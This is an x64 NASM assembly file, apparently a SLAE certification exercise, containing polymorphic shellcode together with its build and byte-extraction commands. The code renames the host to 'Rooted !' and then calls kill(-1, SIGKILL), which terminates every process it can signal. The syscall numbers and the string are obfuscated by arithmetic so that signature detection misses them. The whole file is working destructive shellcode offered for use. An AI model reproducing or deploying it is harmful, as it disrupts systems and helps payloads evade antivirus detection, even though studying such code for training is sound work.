; Filename:      shellcode-polymorphic-asm.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  09.02.2019
; Note:          x64
; Assembler:     nasm -f elf64 shellcode-polymorphic-asm.nasm -o shellcode-polymorphic-asm.o
; Linker:        ld -m elf_x86_64 shellcode-polymorphic-asm.o -o shellcode-polymorphic-asm
; Assembly dump: objdump -d ./shellcode-polymorphic-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

_start:

	;int sethostname(const char *name, size_t len)
	xor rax, rax                ; Clear rax
	xor rsi, rsi                ; Clear rsi
	mov al,0x99                 ; sys_vhangup
	mov r9,0x21206465736e6e51   ; Polymorphic 4 last bytes -1
	add r9,0x01010101           ; "! detooR"
	push r9                     ; Push string to stack
	mov rdi,rsp                 ; *name
	mov sil,0x8                 ; len
	add al, 0x11                ; Polymorphic (sys_sethostname)
	syscall

	;int kill(pid_t pid, int sig)
	push byte +0x3d             ; sys_wait4
	pop rax                     ; Pop value in rax register
	push byte -0x1              ; Push 0xffffffffffffffff
	pop rdi                     ; Pop value in rdi register
	push byte +0x9              ; SIGKILL (9)
	pop rsi                     ; Pop value in rsi register
	inc rax                     ; Polymorphic (sys_kill)
	syscall
